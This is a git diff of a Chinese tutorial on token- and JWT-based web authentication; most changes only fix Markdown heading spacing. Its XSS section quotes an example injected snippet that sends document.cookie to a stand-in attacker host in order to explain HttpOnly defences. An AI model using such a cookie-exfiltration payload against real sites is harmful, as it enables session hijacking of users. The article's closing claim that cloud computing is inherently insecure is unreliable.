@@ -10,14 +10,16 @@ tags:
     - JWT
 ---
 
-#基于Token的WEB后台认证机制
+# 基于Token的WEB后台认证机制
 
 
 
-##几种常用的认证机制
+## 几种常用的认证机制
+
 ### HTTP Basic Auth
 HTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之，Basic Auth是配合RESTful API 使用的最简单的认证方式，只需提供用户名密码即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的RESTful API时，尽量避免采用HTTP Basic Auth
-###OAuth
+
+### OAuth
 
 OAuth（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。
 
@@ -26,11 +28,11 @@ OAuth允许用户提供一个令牌，而不是用户名和密码来访问他们
 ![Alt text](./3e97c6f9-41a7-398e-9cdb-b60afda794e9.png)
 
 这种基于OAuth的认证机制适用于个人消费者类的互联网产品，如社交类APP等应用，但是不太适合拥有自有认证权限管理的企业应用；
-###Cookie Auth
+### Cookie Auth
 Cookie认证机制就是为一次请求认证在服务端创建一个Session对象，同时在客户端的浏览器端创建了一个Cookie对象；通过客户端带上来Cookie对象来与服务器端的session对象匹配来实现状态管理的。默认的，当我们关闭浏览器的时候，cookie会被删除。但可以通过修改cookie 的expire time使cookie在一定时间内有效；
-###Token Auth
+### Token Auth
 ![Alt text](./.无标题2.png)
-####Token Auth的优点
+#### Token Auth的优点
 Token机制相对于Cookie机制又有什么好处呢？
 
 - **支持跨域访问**: Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输.
@@ -43,11 +45,13 @@ Token机制相对于Cookie机制又有什么好处呢？
 - **不需要为登录页面做特殊处理**: 如果你使用Protractor 做功能测试的时候，不再需要为登录页面做特殊处理.
 - **基于标准化**:你的API可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在多个后端库（.NET, Ruby, Java,Python, PHP）和多家公司的支持（如：Firebase,Google, Microsoft）.
 	
-##基于JWT的Token认证机制实现
+
+## 基于JWT的Token认证机制实现
 JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。其
-###JWT的组成
+### JWT的组成
 一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。
 **载荷（Payload）**
+
 ```
 { "iss": "Online JWT Builder", 
   "iat": 1416797419, 
@@ -107,21 +111,24 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJ
 ```
 https://your.awesome-app.com/make-friend/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM
 ```
-###认证过程
+### 认证过程
 下面我们从一个实例来看如何运用JWT机制实现认证：
-####登录
+
+#### 登录
+
 - 第一次认证：第一次登录，用户从浏览器输入用户名/密码，提交后到服务器的登录处理的Action层（Login Action）；
 - Login Action调用认证服务进行用户名密码认证，如果认证通过，Login Action层调用用户信息服务获取用户信息（包括完整的用户信息及对应权限信息）；
 - 返回用户信息后，Login Action从配置文件中获取Token签名生成的秘钥信息，进行Token的生成；
 - 生成Token的过程中可以调用第三方的JWT Lib生成签名后的JWT数据；
 - 完成JWT数据签名后，将其设置到COOKIE对象中，并重定向到首页，完成登录过程；
 
-![Alt text](./111.jpg)
+Alt text
 
-####请求认证
+#### 请求认证
 基于Token的认证机制会在每一次请求中都带上完成签名的Token信息，这个Token信息可能在COOKIE
 中，也可能在HTTP的Authorization头中；
 ![Alt text](./请求认证.jpg)
+
 - 客户端（APP客户端或浏览器）通过GET或POST请求访问资源（页面或调用API）；
 - 认证服务作为一个Middleware HOOK 对请求进行拦截，首先在cookie中查找Token信息，如果没有找到，则在HTTP Authorization Head中查找；
 - 如果找到Token信息，则根据配置文件中的签名加密秘钥，调用JWT Lib对Token信息进行解密和解码；
@@ -129,17 +136,20 @@ https://your.awesome-app.com/make-friend/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1Ni
 - 全部通过后，根据获取的用户的角色权限信息，进行对请求的资源的权限逻辑判断；
 - 如果权限逻辑判断通过则通过Response对象返回；否则则返回HTTP 401；
 
-###对Token认证的五点认识
+### 对Token认证的五点认识
 对Token认证机制有5点直接注意的地方：
+
 - 一个Token就是一些信息的集合；
 -  在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率；
 -  服务端需要对cookie和HTTP Authrorization Header进行Token信息的检查；
 -  基于上一点，你可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端；
 -  因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的；
 	
-###JWT的JAVA实现
+
+### JWT的JAVA实现
 Java中对JWT的支持可以考虑使用[JJWT](https://github.com/jwtk/jjwt)开源库；JJWT实现了JWT, JWS, JWE 和 JWA RFC规范；下面将简单举例说明其使用：
 **生成Token码**
+
 ```
 import javax.crypto.spec.SecretKeySpec;
 import javax.xml.bind.DatatypeConverter;
@@ -198,12 +208,13 @@ System.out.println("Expiration: " + claims.getExpiration());
 }
 
 ```
-##基于JWT的Token认证的安全问题
-###确保验证过程的安全性
+## 基于JWT的Token认证的安全问题
+### 确保验证过程的安全性
 如何保证用户名/密码验证过程的安全性；因为在验证过程中，需要用户输入用户名和密码，在这一过程中，用户名、密码等敏感信息需要在网络中传输。因此，在这个过程中建议采用HTTPS，通过SSL加密传输，以确保通道的安全性。
 
-###如何防范XSS Attacks
+### 如何防范XSS Attacks
 浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击(Cross Site Scripting)；如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码：
+
 ```
 <img src="x" /> a.src='https://hackmeplz.com/yourCookies.png/?cookies=’
 +document.cookie;return a}())"
@@ -231,11 +242,12 @@ response.addHeader("Set-Cookie", "timeout=30; Path=/test; HttpOnly");
 response.addHeader("Set-Cookie", "uid=112; Path=/; Secure; HttpOnly");
 ```
 在实际使用中，我们可以使FireCookie查看我们设置的Cookie 是否是HttpOnly；
-###如何防范Replay Attacks
+### 如何防范Replay Attacks
 所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程。比如在浏览器端通过用户名/密码验证获得签名的Token被木马窃取。即使用户登出了系统，黑客还是可以利用窃取的Token模拟正常请求，而服务器端对此完全不知道，以为JWT机制是无状态的。
     针对这种情况，有几种常用做法可以用作参考：
     1、时间戳 +共享秘钥
     这种方案，客户端和服务端都需要知道：
+
    - User ID
    - 共享秘钥
 **客户端**
@@ -313,7 +325,7 @@ def set_current_user_from_jwt_token
   redis.expireat(key, payload['exp'] + 2)
 end
 ```
-###如何防范MITM （Man-In-The-Middle）Attacks
+### 如何防范MITM （Man-In-The-Middle）Attacks
 所谓MITM攻击，就是在客户端和服务器端的交互过程被监听，比如像可以上网的咖啡馆的WIFI被监听或者被黑的代理服务器等；
 针对这类攻击的办法使用HTTPS，包括针对分布式应用，在服务间传输像cookie这类敏感信息时也采用HTTPS；所以云计算在本质上是不安全的。
 
